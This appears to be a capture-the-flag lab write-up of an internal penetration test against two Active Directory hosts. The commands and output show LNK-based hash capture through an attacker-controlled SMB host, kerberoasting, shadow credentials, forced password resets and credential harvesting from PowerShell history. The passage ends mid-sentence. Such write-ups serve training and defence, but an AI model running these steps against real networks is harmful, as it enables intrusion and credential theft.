# Objective and scope
Orion Corp has hired you to perform an internal penetration test against two machines within their network. Your task is to identify all vulnerabilities and (if possible) elevate your privileges to Domain Admin.

The client has provided you with VPN access to their network, but no credentials.

![806](Pasted%20image%2020261015174115.png)

There are two hosts in scope

```python
❯❯❯ ping 10.0.0.6
PING 10.0.0.6 (10.0.0.6) 56(84) bytes of data.
64 bytes from 10.0.0.6: icmp_seq=1 ttl=127 time=94.1 ms

❯❯❯ ping 10.0.0.5     
PING 10.0.0.5 (10.0.0.5) 56(84) bytes of data.
64 bytes from 10.0.0.5: icmp_seq=1 ttl=127 time=93.9 ms
```

I can reach both hosts, so likely no tunneling in this instance

# Enumeration
## WS-IT (10.0.0.6)

### Open ports
```python
❯❯❯ nmap -p- --min-rate=1000 -sT -Pn 10.0.0.6 -vv 

Nmap scan report for 10.0.0.6
Host is up, received user-set (0.093s latency).
Scanned at 2026-10-15 17:45:44 BST for 128s
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON
135/tcp   open  msrpc         syn-ack
139/tcp   open  netbios-ssn   syn-ack
445/tcp   open  microsoft-ds  syn-ack
3389/tcp  open  ms-wbt-server syn-ack
5985/tcp  open  wsman         syn-ack
49674/tcp open  unknown       syn-ack
```

### Nmap
```python
❯❯❯ nmap -p 135,139,445,3389,5985 -A --min-rate=1000 -sT -Pn 10.0.0.6
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-15 17:48 +0100
Nmap scan report for 10.0.0.6
Host is up (0.094s latency).

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server
| rdp-ntlm-info: 
|   Target_Name: ORION
|   NetBIOS_Domain_Name: ORION
|   NetBIOS_Computer_Name: WS-IT
|   DNS_Domain_Name: orion.local
|   DNS_Computer_Name: WS-IT.orion.local
|   DNS_Tree_Name: orion.local
|   Product_Version: 10.0.26100
|_  System_Time: 2026-10-15T16:49:01+00:00
| ssl-cert: Subject: commonName=WS-IT.orion.local
| Not valid before: 2026-10-02T15:45:35
|_Not valid after:  2027-04-03T15:45:35
|_ssl-date: TLS randomness does not represent time
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.991%I=7%D=10/15%Time=6AD103F4%P=x86_64-pc-linux-gnu%r(
SF:TerminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x0
SF:2\0\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## DC01 (10.0.0.5)
### Open ports
```python
❯❯❯ nmap -p- --min-rate=1000 -sT -Pn 10.0.0.5 -vv

Host is up, received user-set (0.093s latency).
Scanned at 2026-10-15 17:53:13 BST for 1697s
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
3389/tcp  open  ms-wbt-server    syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
49664/tcp open  unknown          syn-ack
49667/tcp open  unknown          syn-ack
49668/tcp open  unknown          syn-ack
49670/tcp open  unknown          syn-ack
49671/tcp open  unknown          syn-ack
49693/tcp open  unknown          syn-ack
49715/tcp open  unknown          syn-ack
49733/tcp open  unknown          syn-ack
49807/tcp open  unknown          syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1697.14 seconds
```

Nmap is being really slow so i wont bother scanning these ports in depth, im also not sure the lab infrastructure can handle any more traffic

# Host file setup on both machines

```python
❯❯❯ sudo nxc smb 10.0.0.6 --generate-hosts-file /etc/hosts         
SMB         10.0.0.6        445    WS-IT            [*] Windows 11 / Server 2025 Build 26100 x64 (name:WS-IT) (domain:orion.local) (signing:True) (SMBv1:None)

❯❯❯ sudo nxc smb 10.0.0.5 --generate-hosts-file /etc/hosts
SMB         10.0.0.5        445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:orion.local) (signing:True) (SMBv1:None) (Null Auth:True)
```

# SMB (445 - DC01)

```python
❯❯❯ nxc smb dc01.orion.local -u '' -p ''                                             
SMB         10.0.0.5        445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:orion.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.0.5        445    DC01             [+] orion.local\:
```

There is null auth

However i cannot do anything with it

The guest account is also disabled

# SMB (445 - WS-IT)

```python
❯❯❯ nxc smb ws-it.orion.local -u 'Guest' -p '' --smb-timeout 10 --shares
SMB         10.0.0.6        445    WS-IT            [*] Windows 11 / Server 2025 Build 26100 x64 (name:WS-IT) (domain:orion.local) (signing:True) (SMBv1:None)
SMB         10.0.0.6        445    WS-IT            [+] orion.local\Guest: 
SMB         10.0.0.6        445    WS-IT            [*] Enumerated shares
SMB         10.0.0.6        445    WS-IT            Share           Permissions     Remark
SMB         10.0.0.6        445    WS-IT            -----           -----------     ------
SMB         10.0.0.6        445    WS-IT            ADMIN$                          Remote Admin
SMB         10.0.0.6        445    WS-IT            C$                              Default share
SMB         10.0.0.6        445    WS-IT            Company                         Company documents - all staff
SMB         10.0.0.6        445    WS-IT            IPC$            READ            Remote IPC
SMB         10.0.0.6        445    WS-IT            IT                              IT admins only
SMB         10.0.0.6        445    WS-IT            Uploads         READ,WRITE      Public Upload Share
```

The guest account is enabled on the `WS-IT` machine

Also read and write on uploads

```python
❯❯❯ smbclient.py orion.local/Guest:''@ws-it.orion.local                          
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

Password:
Type help for list of commands
# shares
Share Name                Type            Comment
----------------------------------------------------------------------
ADMIN$                    DISK (SPECIAL)  Remote Admin
C$                        DISK (SPECIAL)  Default share
Company                   DISK            Company documents - all staff
IPC$                      IPC (SPECIAL)   Remote IPC
IT                        DISK            IT admins only
Uploads                   DISK            Public Upload Share
# use Uploads
# ls
drw-rw-rw-          0  Thu Oct 15 18:10:22 2026 .
drw-rw-rw-          0  Sat Oct  3 20:59:18 2026 ..
-rw-rw-rw-        509  Sat Oct  3 17:24:40 2026 README.txt
# get README.txt
# 
```

There is a read me file

```python
# cat README.txt
Orion Corp - Public Upload Share
=================================

This share is provided for staff to drop files for the IT department
(scanned documents, logs, screenshots, driver files, etc.).

GUIDELINES
----------
- Files placed here are collected and processed by IT daily.
- Do NOT store sensitive or personal data in this folder.
- Files older than 30 days are automatically removed.
- For urgent requests, contact the helpdesk: helpdesk@orion.local

Thank you,
Orion Corp IT Operations
# 
```

Since i have write access i could try a watering hole attack

# Watering hole attack leads to user compromise

```python
❯❯❯ sudo responder -I tun0
```

First ill start responder

```python
❯❯❯ nxc smb ws-it.orion.local -u 'Guest' -p '' --smb-timeout 5 -M slinky -o SERVER=192.168.211.2 NAME=meeting ICO_URL=\\\\192.168.211.2\\share SHARES=Uploads 
SMB         10.0.0.6        445    WS-IT            [*] Windows 11 / Server 2025 Build 26100 x64 (name:WS-IT) (domain:orion.local) (signing:True) (SMBv1:None)
SMB         10.0.0.6        445    WS-IT            [+] orion.local\Guest: 
SMB         10.0.0.6        445    WS-IT            [*] Enumerated shares
SMB         10.0.0.6        445    WS-IT            Share           Permissions     Remark
SMB         10.0.0.6        445    WS-IT            -----           -----------     ------
SMB         10.0.0.6        445    WS-IT            ADMIN$                          Remote Admin
SMB         10.0.0.6        445    WS-IT            C$                              Default share
SMB         10.0.0.6        445    WS-IT            Company                         Company documents - all staff
SMB         10.0.0.6        445    WS-IT            IPC$            READ            Remote IPC
SMB         10.0.0.6        445    WS-IT            IT                              IT admins only
SMB         10.0.0.6        445    WS-IT            Uploads         READ,WRITE      Public Upload Share
SLINKY      10.0.0.6        445    WS-IT            [+] Found writable share: Uploads
SLINKY      10.0.0.6        445    WS-IT            [+] Created LNK file on the Uploads share
```

Ill use the nxc slinky module to create and upload the file for me

```python
[SMB] NTLMv2-SSP Client   : 10.0.0.6
[SMB] NTLMv2-SSP Username : ORION\b.williams
[SMB] NTLMv2-SSP Hash     : b.williams::ORION:3040b290a0bf746d:0DA688FCF329126B8CC0782ABB0A0762:0101000000000000808D6A92DC5CDD01D6EA5C8DE1008B1500000000020008005A004D004E00570001001E00570049004E002D00540058004500480031004A004700330055004500330004003400570049004E002D00540058004500480031004A00470033005500450033002E005A004D004E0057002E004C004F00430041004C00030014005A004D004E0057002E004C004F00430041004C00050014005A004D004E0057002E004C004F00430041004C0007000800808D6A92DC5CDD010600040002000000080030003000000000000000000000000020000047846DB57DB62A66DDB68072E88BB1B5E9716B11309E2518074F8C347B8C9E660A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003200310031002E0032000000000000000000
```

I have captured the hash

```python
B.WILLIAMS::ORION:3040b290a0bf746d:0da688fcf329126b8cc0782abb0a0762:0101000000000000808d6a92dc5cdd01d6ea5c8de1008b1500000000020008005a004d004e00570001001e00570049004e002d00540058004500480031004a004700330055004500330004003400570049004e002d00540058004500480031004a00470033005500450033002e005a004d004e0057002e004c004f00430041004c00030014005a004d004e0057002e004c004f00430041004c00050014005a004d004e0057002e004c004f00430041004c0007000800808d6a92dc5cdd010600040002000000080030003000000000000000000000000020000047846db57db62a66ddb68072e88bb1b5e9716b11309e2518074f8c347b8c9e660a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e003200310031002e0032000000000000000000:williams123
```

The hash cracked in hashcat

```python
❯❯❯ nxc smb dc01.orion.local -u 'b.williams' -p 'williams123' --smb-timeout 5 
SMB         10.0.0.5        445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:orion.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.0.5        445    DC01             [+] orion.local\b.williams:williams123 

❯❯❯ nxc smb ws-it.orion.local -u 'b.williams' -p 'williams123' --smb-timeout 5
SMB         10.0.0.6        445    WS-IT            [*] Windows 11 / Server 2025 Build 26100 x64 (name:WS-IT) (domain:orion.local) (signing:True) (SMBv1:None)
SMB         10.0.0.6        445    WS-IT            [+] orion.local\b.williams:williams123 
```

This user is now compromised

Before i dive deeper on the workstation ill do some domain enumeration first

# Domain Enumeration

## Users
```python
❯❯❯ nxc smb dc01.orion.local -u 'b.williams' -p 'williams123' --smb-timeout 5 --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC01$
b.williams
j.carter
s.mitchell
d.brooks
m.reeves
svc-pki
m.white
WS-IT$
svc-onboarding
d.miller
```

Ill get all the domain users

Ill also collect bloodhound data

There are just default shares on the domain controller

# Kerberoasting leads to user compromise

```python
❯❯❯ nxc ldap dc01.orion.local -u 'b.williams' -p 'williams123' --kerberoasting kerb.hash
LDAP        10.0.0.5        389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:orion.local) (signing:Enforced) (channel binding:When Supported) 
LDAP        10.0.0.5        389    DC01             [+] orion.local\b.williams:williams123 
LDAP        10.0.0.5        389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.0.0.5        389    DC01             [*] Total of records returned 1
LDAP        10.0.0.5        389    DC01             [*] sAMAccountName: svc-onboarding, memberOf: CN=Helpdesk Operators,OU=Orion,DC=orion,DC=local, pwdLastSet: 2026-10-06 20:30:28.048542, lastLogon: <never>
LDAP        10.0.0.5        389    DC01             $krb5tgs$23$*svc-onboarding$ORION.LOCAL$orion.local\svc-onboarding*$0119ebdcbd8f781dfc4f9ed23e0ece37$f2d32ef7822cdc6687c75fe27e59b1c964568298ce682ba2c8561236f6541d547e10ac6b505d751e5ce46dde9d124f17aefc91957de0faf6fc3093a6d0b88f8a2dd56df3fa170149b2da4392ce3a2cbaac9d03162d4f9a04ffd2c95867f1d361aa69651e2a3f40c493d4b8f928258ad71c227e52eb67961228e021b76a8ecf8d154100f7c27cedc2e08ce3db5ac55af26a84da37970df54679268c69f6524838c8f82a08059caa4e65fc8289b00b17455bcfe89b0b2ecd252240b517dea46368e599f8cee1341e8d2184b46c4f4dc13865d24cfd9d32cf28aeb32876f629ef9b8b1cda357b9245556261a6dfccdb1c787ad7734a41ba4592db45b5936a4eab20bf2f08342d715fc530234db6437c105fe24aefb0f61d2a0439fa1b5f1a5ea127e8335df208749155cb6cb96109590ec3b1373a92ff64d983aced53c02e8d87ab6c14ec49ee95ef5d9212eaa3d9bc11684c7a720098df77022c93ef03c964636a1c10ea4cb33f55d860fc82ac3539a221eb78876879f1b2977878af83365e41c5435c04cbcab3ed7d7b282b1e7c5c61a5086e1456528ed9c734041e3cbc9c1f3838a9451868edc3be442f22554f50c414736603b94bd01f3a59d6e132147f2cd9340dc50fbbb6cd149aad5b95a0aaae9ac5746166b68197c90084b904700f926dc3c1c61f08928c7cb08e5a4c889b3f6ec4436928205c7cd933a8e6ded44f91c147ca9778bbd7987b05604bb43de33557a801a1c843b572fa1dc8046c30171ee761b390b32c96dc8299638b771b91334ff69a2da8c74b078edc3f482fdd35586afd51fc4dc2b707f84284a036ff2d362f756d49a45c1f3bea5770165a1dcdf14f319c34579a12cc282292b695bfaa1d719ab69771602e0ccc297cc896423f159d4fac6cfb052c9d01df913ebbf506e06dd7b0055b1890768310858add55a65c1f131583ffa97f996b22c5dc7585dde6678fe2029c4510930418fc67dfe6afb5a8ca2880739c959f191f55ef050e9b18c55b842b7fbe06850ff26d8e78f8e1bd0e7898176d52b8cdd3ec75d0f2a9953133482c6e0da071a5a7377db8eff9687dde140763a287e9bc29269824a4742de0dc82b6d5ddaa01e233c896263b173bda03e336643c06ca0fe20edaeb213a08ff4bf4108be764784cfcd530f4f0e34b4d3322725859c0329320eb7a1a206d1a577cfbb2c28fc3ccf32af8386bd7f2124dd87dd8650ce2e3b549a1fb447119007f54f716bc5807270c13feae66cb00ba898212eca1312be31f398ac0537454a47ce746f32f056c788980d0d9dc4bef4e0f6a2dcc270754d6144cb6b5955e9018dccaf7426747219e586f8456daedd586552db3e5022e6ee83b2c4d3c194c834ff6589b1fdb6c5b0c10df1eeac9707d9c17d37d7e81d31033a22f49b925c5ba7570644681bd1b78be0f8c20500e95b1f4cf68da3dbaa45396203f45ab25d812c59af5e160c4510176
```

There is a kerberoastable user

```python
$krb5tgs$23$*svc-onboarding$ORION.LOCAL$orion.local\svc-onboarding*$0119ebdcbd8f781dfc4f9ed23e0ece37$f2d32ef7822cdc6687c75fe27e59b1c964568298ce682ba2c8561236f6541d547e10ac6b505d751e5ce46dde9d124f17aefc91957de0faf6fc3093a6d0b88f8a2dd56df3fa170149b2da4392ce3a2cbaac9d03162d4f9a04ffd2c95867f1d361aa69651e2a3f40c493d4b8f928258ad71c227e52eb67961228e021b76a8ecf8d154100f7c27cedc2e08ce3db5ac55af26a84da37970df54679268c69f6524838c8f82a08059caa4e65fc8289b00b17455bcfe89b0b2ecd252240b517dea46368e599f8cee1341e8d2184b46c4f4dc13865d24cfd9d32cf28aeb32876f629ef9b8b1cda357b9245556261a6dfccdb1c787ad7734a41ba4592db45b5936a4eab20bf2f08342d715fc530234db6437c105fe24aefb0f61d2a0439fa1b5f1a5ea127e8335df208749155cb6cb96109590ec3b1373a92ff64d983aced53c02e8d87ab6c14ec49ee95ef5d9212eaa3d9bc11684c7a720098df77022c93ef03c964636a1c10ea4cb33f55d860fc82ac3539a221eb78876879f1b2977878af83365e41c5435c04cbcab3ed7d7b282b1e7c5c61a5086e1456528ed9c734041e3cbc9c1f3838a9451868edc3be442f22554f50c414736603b94bd01f3a59d6e132147f2cd9340dc50fbbb6cd149aad5b95a0aaae9ac5746166b68197c90084b904700f926dc3c1c61f08928c7cb08e5a4c889b3f6ec4436928205c7cd933a8e6ded44f91c147ca9778bbd7987b05604bb43de33557a801a1c843b572fa1dc8046c30171ee761b390b32c96dc8299638b771b91334ff69a2da8c74b078edc3f482fdd35586afd51fc4dc2b707f84284a036ff2d362f756d49a45c1f3bea5770165a1dcdf14f319c34579a12cc282292b695bfaa1d719ab69771602e0ccc297cc896423f159d4fac6cfb052c9d01df913ebbf506e06dd7b0055b1890768310858add55a65c1f131583ffa97f996b22c5dc7585dde6678fe2029c4510930418fc67dfe6afb5a8ca2880739c959f191f55ef050e9b18c55b842b7fbe06850ff26d8e78f8e1bd0e7898176d52b8cdd3ec75d0f2a9953133482c6e0da071a5a7377db8eff9687dde140763a287e9bc29269824a4742de0dc82b6d5ddaa01e233c896263b173bda03e336643c06ca0fe20edaeb213a08ff4bf4108be764784cfcd530f4f0e34b4d3322725859c0329320eb7a1a206d1a577cfbb2c28fc3ccf32af8386bd7f2124dd87dd8650ce2e3b549a1fb447119007f54f716bc5807270c13feae66cb00ba898212eca1312be31f398ac0537454a47ce746f32f056c788980d0d9dc4bef4e0f6a2dcc270754d6144cb6b5955e9018dccaf7426747219e586f8456daedd586552db3e5022e6ee83b2c4d3c194c834ff6589b1fdb6c5b0c10df1eeac9707d9c17d37d7e81d31033a22f49b925c5ba7570644681bd1b78be0f8c20500e95b1f4cf68da3dbaa45396203f45ab25d812c59af5e160c4510176:password2510
```

```python
❯❯❯ nxc smb dc01.orion.local -u 'svc-onboarding' -p 'password2510' 
SMB         10.0.0.5        445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:orion.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.0.5        445    DC01             [+] orion.local\svc-onboarding:password2510
```

This user is now compromised

# Password change leads to user compromise

![](Pasted%20image%2020261015201525.png)

Using this new user, ill look at bloodhound and i see this user has the ability to change the password of three users

`s.mitchell` looks the most interesting since he is part of three groups and has two outbound object control

```python
❯❯❯ bloodyAD --host dc01.orion.local -d orion.local -u svc-onboarding -p 'password2510' set password 's.mitchell' 'Password123!'
[+] Password changed successfully!
```

Ill use bloodyAD to change the password

```python
❯❯❯ nxc smb dc01.orion.local -u 's.mitchell' -p 'Password123!' 
SMB         10.0.0.5        445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:orion.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.0.5        445    DC01             [+] orion.local\s.mitchell:Password123! 
```

This user is compromised

# Enumeration as `s.mitchell`

![](Pasted%20image%2020261015201939.png)

This user has GenericWrite on two users

So this means i can apply shadow credentials or do a targeted kerberoast

`m.white` looks more interesting, they are in more groups

```python
❯❯❯ bloodyAD --host dc01.orion.local -d orion.local -u 's.mitchell' -p 'Password123!' set object 'm.white' servicePrincipalName -v 'service/hacked' 
[+] m.white's servicePrincipalName has been updated
```

First ill add an SPN

```python
❯❯❯ nxc ldap dc01.orion.local -u s.mitchell -p 'Password123!' --kerberoasting kerb2.hash

...[SNIP]...

$krb5tgs$18$m.white$ORION.LOCAL$*orion.local\m.white*$0d7361dbfd50a7708aa0ad4a$f4cdab750b1d2e4b5b0098ac4754519109ba87332a5728419a449c29eb5f81b7fff52eda9e0ef0314c29febbe8024bae03c2d152b612668d456f280415a9ff83925af1fca4eee5dcba4a171ea8c83050012ff92625bdb2bd9b6b63f567b5c0cb6b77ac8a63b80c7986ae195361004936c5806047fb9ebef02e7e4443cba4016a298fd65a452757fb64017a89769c750045357713a001e2ab82a1153d6dfce1fd08d8fbe71ae2be486f0afe33d00cf22beab38e8d40825ad01ded3fbfb622b295335c22ce53d7ae7107bf2d506bba85f358068d632e15934d598db6758896a05077a71f902fd440496d401aa05b68a6dd14c2da73e1a6a61eed5394bde0d93dacf9bcdca3596847f0833308f6cbfbae0ce9b987b34d20de21f84200e2e797c850b37f370a76dd9feecdcff63cafac73ea18ad2b8bbb3a84914c7c7c4fc09a1f659b02c1e73c5ce5e48b87f21273430493fab0cd353bf8307a30dbf36f09b94c5c7a5a21d0fa47a476f80970a17d398ed095896b8f171db9af39a1797c8450a7a255d8d53afffb347166ad03e6378df43e23fb0e826adfbd2e6e957cded041b37e360a334946cc5a5419a4e7ff71b03f6089d7120f0f8bc842a52feb6f29f1048de0cfed97dd728a968ea354ae92788e355e7890331ca935bc9109910f576b9280fdef16eff86e3fba8a1c99c900554f845e565f3e8396a5ef9844b16ed45dabff0ca97a8610fb788418f32b992facca92802f4dac05c4bf336c4b1d4ea8832b0a7242e6aadc97ba5ce835318ec17d2a359ce9374a919fd6a9cb006284a37c9f431d542e51b36319efe5cfdfc10662f9b85f0859de03fac22829d91298496f256b36cb38896405780773a01bd40a4cefc63fe1395397de0bc4d6a28ff3d0301f9bfb490a9257acdfdbd93e9853d23e046046e5839bf9a79497a6dc3aae00eab7c657f786e53f39e377d7e7044ece2af7bfcb0185f2fe8a1aca0cddf9959738c31ccf3236224e6d5c02c886ca9542b0c7294a1c969bda6ea536f428638f0b9070bc0de9c35b1335c5d5a4a6db3c361af00bdd4dc2e1886392e259e2e9854c588dffd5ec2fc338d4a9aacf701dabbf56a2728cde4f2dd1c542a54661b63547312cd702d104f5f8122b5367a693ea1aa91918d1e8d9b93c4f4e7aa8b6c3cfad2e5e2af21f6e52834101be5023088ebe079ad23eb60d9b60384c18bfe4528d71003cca8cda486e48c9c480cbc0e9294dbb0c07da381beff8e9eaad22a53da187de2d8c0054085f1aad5132986536328a96402a74324efac440a322cde5a728d0ab1286874df0cccb81fcb18ec68ccd33c6b25a7e478d02aa3180d228c163640543d50e249e69b65c4414e02908fef2bb8fc3844ad37cfd0e4b3844690d98d09bbf9bc23afcefffeb485f6029dea7cfdb06291311bb64358c5a42ad27a366545248fae42e1e589d8eb0f329cd9fe8be16ac0a1eec78a5c9204465b6444ba2dae42dda846af93e04d2d0e383fd10a6074e05
```

I can now try and crack this

This does not crack, so ill try a shadow creds attack

# Compromising `m.white`

```python
❯❯❯ bloodyAD --host dc01.orion.local -d orion.local -u 's.mitchell' -p 'Password123!' add shadowCredentials 'm.white' 
[+] KeyCredential generated with following sha256 of RSA key: 8da4945f5b4eb0e8f0b6a1c6067dca4c221ab4f579a50150716b155f6b9b7bcd
[-] PKINIT failed on DC 10.0.0.5, you must find a Kerberos server with a certification authority!
[-] Retry on a working KDC and do:
badNTPKInit 'kerberos+pfx://orion.local\m.white@10.0.0.5/?certdata=m.white_A5.pfx&timeout=350'
[+] PKINIT PFX certificate saved at: m.white_A5.pfx
[+] TGT stored in ccache file m.white_A5.ccache
```

Ill use bloodyAD to add shadow credentials, it fails to get me the NTLM, but it does give me a TGT

```python
❯❯❯ export KRB5CCNAME=m.white_A5.ccache

❯❯❯ nxc smb dc01.orion.local --use-kcache         
SMB         dc01.orion.local 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:orion.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc01.orion.local 445    DC01             [+] ORION.LOCAL\m.white from ccache 
```

This way i can auth as this user

![](Pasted%20image%2020261015204146.png)

This user is in a group which suggests i can get remote access to the `ws-it` machine

# Winrm access as `m.white` on the `WS-IT` machine

```python
 ❯❯❯ sudo nxc smb dc01.orion.local --use-kcache --generate-krb5-file /etc/krb5.conf
[sudo] password for kali: 
SMB         dc01.orion.local 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:orion.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc01.orion.local 445    DC01             [+] krb5 conf saved to: /etc/krb5.conf
SMB         dc01.orion.local 445    DC01             [+] Run the following command to use the conf file: export KRB5_CONFIG=/etc/krb5.conf
SMB         dc01.orion.local 445    DC01             [+] ORION.LOCAL\m.white from ccache 
```

First ill generate a realm

```python
❯❯❯ evil-winrm-py -i ws-it.orion.local -u m.white -k --no-pass
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'ws-it.orion.local:5985' as 'm.white'
evil-winrm-py PS C:\Users\m.white\Documents>
```

Then i can login as this user

![](Pasted%20image%2020261015204554.png)

Then i can get the user flag

# Enumerating the file system on the workstation

```python
evil-winrm-py PS C:\Shares\Company> dir


    Directory: C:\Shares\Company


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a----         10/3/2026   8:00 PM           3303 Holiday_Schedule_2026.pdf                                             
-a----         10/3/2026   8:11 PM        1133880 Orion_Corp_Company_Profile.pdf                                        
-a----         10/3/2026   8:00 PM           3422 Shipping_Rates_2026.pdf                                               


evil-winrm-py PS C:\Shares\Company>
```

I can now view the pdf files in this share

There is nothing interesting in the pdf files

```python
evil-winrm-py PS C:\Users\m.white\Appdata\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_hi
story.txt
Get-Process
Get-ChildItem C:\Shares
cd C:\Shares\IT
dir
ipconfig /all
Test-Connection DC01
$cred = New-Object System.Management.Automation.PSCredential('ORION\m.reeves', (ConvertTo-SecureString 'Pa$$word!123' -AsPlainText -Force))
Invoke-Command -ComputerName WS-IT -Credential $cred -ScriptBlock { whoami }
net use Z: \\WS-IT\IT /user:ORION\m.reeves Pa$$word!123
Get-EventLog -LogName System -Newest 10
cls
exit
evil-winrm-py PS C:\Users\m.white\Appdata\Roaming\Microsoft\Windows\PowerShell\PSReadLine>
```

Found some credentials in the powershell history

# Compromising `m.reeves`

```python
❯❯❯ nxc smb dc01.orion.local -u m.reeves -p 'Pa$$word!123'
SMB         10.0.0.5        445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:orion.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.0.5        445    DC01             [+] orion.local\m.reeves:Pa$$word!123 
```

This user is now compromised

![](Pasted%20image%2020261015205901.png)

This user also has remote access here, and he is an admins group

# Access to WINRM as `m.reeves` on the `WS-IT`

```python
❯❯❯ evil-winrm-py -i ws-it.orion.local -u m.reeves -p 'Pa$$word!123'   
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'ws-it.orion.local:5985' as 'm.reeves'
evil-winrm-py PS C:\Users\m.reeves\Documents>
```

Now ill log in 

```python
evil-winrm-py PS C:\Shares\IT> dir


    Directory: C:\Shares\IT


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
d-----         10/3/2026   7:58 PM                Docs                                                                  
d-----         10/3/2026   4:22 PM                Logs                                                                  
d-----         10/3/2026   7:55 PM                Scripts                                                               
d-----         10/3/2026   7:56 PM                Tools                                                                 


evil-winrm-py PS C:\Shares\IT>
```

This user has access to the IT share, this is likely the admin group bloodhound showed allowing us acc